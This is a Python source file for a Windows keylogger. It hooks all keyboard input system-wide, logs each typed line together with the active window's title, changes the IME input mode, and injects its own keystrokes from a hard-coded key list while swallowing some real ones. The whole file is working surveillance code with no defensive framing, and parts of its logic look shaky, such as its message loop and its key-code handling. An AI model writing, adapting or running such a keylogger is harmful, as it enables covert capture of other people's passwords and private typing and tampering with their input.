import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
from ctypes.wintypes import HWND

from win32.win32gui import *


user32 = windll.user32
kernel32 = windll.kernel32
imm32 = windll.imm32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

hookedKey = list()
babo = [0x51,0x4B,0x51,0x48]


class KeyLogger:
    def __init__(self):
        self.iu32 = user32
        self.hooked = None

    def installHookProc(self, pointer):
        self.hooked = self.iu32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if not self.hooked:
            return
        self.iu32.UnhookWindowsHookEx(self.hooked)
        self.hooked=None

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):
    global babo
    pf = False
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

    hookedKey.append(chr(lParam[0]))

    if chr(lParam[0]) == '\r':
        print(''.join(hookedKey))
        hookedKey.clear()

    if CTRL_CODE == int(lParam[0]):
        print("unset!")
        keyLogger.uninstallHookProc()
        sys.exit(-1)

    handle = user32.GetForegroundWindow()

    print(GetWindowText(handle))
    lang = imm32.ImmGetContext(handle)

    imm32.ImmSetConversionStatus(lang, 0x0001, 0)
    imm32.ImmReleaseContext(handle, lang)

    if babo:
        user32.keybd_event(babo.pop(), 0, 0x0001, 0)

    if len(babo) == 4 :
        return 1
    babo.append(int(lParam[0]))
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
"""
def FindchildWindow(handle):
    child = None
    child = user32.FindWindowExA(handle, child, None, None)
    while child != 0:
        lang = imm32.ImmGetContext(child)
        if lang != 0:
            break
    return lang
"""
def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg),0,0,0)



if __name__ == '__main__':
    keyLogger = KeyLogger()
    pointer = getFPTR(hookProc)
    if keyLogger.installHookProc(pointer):
        print("keylogger has been started 'ctrl' to unset the keylogger")

    startKeyLog()